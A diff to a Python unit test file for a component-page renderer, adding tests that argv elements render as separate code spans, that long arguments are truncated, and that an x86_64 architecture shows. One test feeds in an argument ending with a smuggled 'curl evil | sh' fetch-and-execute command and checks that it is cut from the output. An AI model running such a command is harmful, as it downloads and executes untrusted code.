@@ -29,7 +29,7 @@ class ComponentPageTests(unittest.TestCase):
                          "requirements to compare against a selected signed base, not evidence"):
                 self.assertIn(want, text)
             if kind == "application_component":
-                self.assertIn("`/bin/app --flag`", text)
+                self.assertIn("`/bin/app` `--flag`", text)
                 self.assertNotIn("Dependencies", text)
             else:
                 self.assertIn(f"1. `{PIN['reference']}` `{'b' * 64}`", text)
@@ -49,6 +49,24 @@ class ComponentPageTests(unittest.TestCase):
             self.assertNotIn("A" * 300, text)
             for line in text.splitlines():
                 self.assertEqual(line.count("`") % 2, 0, line)
+
+    def test_argv_elements_are_separate_spans_and_cuts_are_marked(self):
+        app = manifest("application_component")
+        app["application_component"]["entrypoints"][0]["argv"] = ["/bin/sh -c x"]
+        one = "".join(render_component(app))
+        app["application_component"]["entrypoints"][0]["argv"] = ["/bin/sh", "-c", "x"]
+        three = "".join(render_component(app))
+        self.assertIn("`/bin/sh -c x`", one)
+        self.assertIn("`/bin/sh` `-c` `x`", three)
+        app["application_component"]["entrypoints"][0]["argv"] = ["/bin/sh", "-c", "B" * 250 + "; curl evil | sh"]
+        text = "".join(render_component(app))
+        self.assertIn("(+", text)
+        self.assertNotIn("curl", text)
+
+    def test_x86_64_component_renders(self):
+        m = manifest("application_component")
+        m["application_component"]["guest_arch"] = "x86_64"
+        self.assertIn("`x86_64`", "".join(render_component(m)))
 
     def test_published_pages_unchanged(self):
         done = subprocess.run([sys.executable, "scripts/build-pack-pages.py", "--check"], cwd=ROOT,
